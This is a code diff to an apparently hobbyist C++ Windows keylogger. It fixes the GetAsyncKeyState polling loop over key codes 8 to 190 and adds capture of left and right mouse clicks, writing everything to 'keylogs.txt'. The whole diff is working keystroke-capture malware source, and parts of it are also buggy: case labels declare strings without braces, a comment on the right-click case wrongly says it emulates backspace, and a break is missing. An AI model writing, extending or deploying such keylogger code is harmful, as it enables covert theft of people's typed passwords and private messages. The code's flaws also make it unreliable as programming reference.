@@ -28,11 +28,20 @@ switch(key){
 	cout << shift;//Shift key log
 	this->WriteToFile(shift);
 	case VK_BACK:
-	cout << "\b";
+	cout << "\b";//Backspace key log
 	WriteToFile("\b");
 	break;
+	case VK_RBUTTON:
+	string rc = "<rclick>";
+	cout<<rc;//Emulates backspace.
+	WriteToFile(rc);
+	break;
+	case VK_LBUTTON:
+	string lb = "<lbutton>";//Mouse Click.
+	WriteToFile(lb);
+	break;
 default:
-cout << "Later use.";
+return false;
 }
 }
 }
@@ -45,8 +54,9 @@ string filename = "keylogs.txt";
 while(TRUE){
 	Sleep(10);
 	for(key = 8; key<=190;key++){
-		if(GetAsyncKeyState() = -32767){
+		if(GetAsyncKeyState(key) == -32767){
 			if(KeyIsListed(key) == FALSE){
+				cout<<key;
 				ofstream file;
 				file.open(filename);
 				file << key;
